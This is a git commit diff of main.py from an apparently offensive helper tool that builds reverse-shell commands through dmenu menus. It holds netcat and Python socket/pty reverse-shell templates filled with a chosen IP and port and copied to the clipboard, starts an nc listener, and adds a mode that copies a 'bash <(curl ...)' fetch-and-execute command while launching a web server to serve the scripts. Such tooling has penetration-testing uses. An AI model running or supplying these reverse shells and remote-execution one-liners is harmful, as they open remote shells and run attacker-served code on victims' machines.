abcd4ecaa6ff8c83f39efdcd6a31580023af3b9a
d4 r c k h <35298550+d4rckh@users.noreply.github.com>
2021-05-24 09:46:48 -0400

    add web server functionality for serving remote scripts

--- main.py
+++ main.py
@@ -2,7 +2,12 @@
 
 import clipboard
 import dmenu
-import os
+from os import listdir, system
+from os.path import isfile, join, exists
+from pathlib import Path
+
+home = str(Path.home())
+
 
 # Helper Functions
 getKeys = lambda dict: \
@@ -12,7 +17,7 @@ copy = lambda text: \
 buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
 						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)
 buildPrompt = lambda options, prompt: \
-						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-17:normal")
+						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-16:normal")
 
 reverseShellTemplates = {
 	"netcat": "nc (ip) (port) -e (sh)",
@@ -20,12 +25,31 @@ reverseShellTemplates = {
 	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
 }
 
-x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
-ip = buildPrompt([], "Type in your IP")
-port = buildPrompt([], "Type in your PORT (ports >1024 are recommended)")
+menu = buildPrompt([
+	"Reverse Shell",
+	"Run Remote Script (creates a web server)"
+], "Task")
 
-copy(buildShellCommand(x, ip, port, "/bin/sh"))
-createListener = buildPrompt([], "The reverse shell command has been copied to your clipboard. Do you want me to create a listener for you?( y/n )")
+if menu == "Reverse Shell":
+	x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
+	ip = buildPrompt([], "Type in your IP")
+	port = buildPrompt([], "Type in your PORT (>1024 recommended)")
 
-if createListener:
-	os.system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e nc -nvlp {port}")
+	copy(buildShellCommand(x, ip, port, "/bin/sh"))
+	createListener = buildPrompt(["yes", "no"], "The reverse shell command has been copied to your clipboard. Do you want me to create a listener for you?( y/n )")
+
+	if createListener == "yes":
+		system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e nc -nvlp {port}")	
+elif menu == "Run Remote Script (creates a web server)":
+	if not exists(f"{home}/.shlol/scripts"):
+		buildPrompt([], "WARNING: ~/.shlol/scripts NOT FOUND! PLEASE CREATE IT AND PUT YOUR SCRIPTS IN IT")
+	else:
+		onlyfiles = [f for f in listdir(f"{home}/.shlol/scripts") if isfile(join(f"{home}/.shlol/scripts", f))]
+		script = buildPrompt(onlyfiles, "What script to you want to serve?")
+		ip = buildPrompt([], "What's your IP?")
+		port = buildPrompt([], "What's your PORT (>1024 recommended)?")
+		copy(f"bash <(curl -s http://{ip}:{port}/{script})")
+		createServer = buildPrompt(["yes", "no"], "The command to run the file from your server has been copied. Do you want me to create a web server for you?( y/n )")
+		if createServer == "yes":
+			system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e \"cd {home}/.shlol/scripts;python3 -m http.server {port}\"")	
+
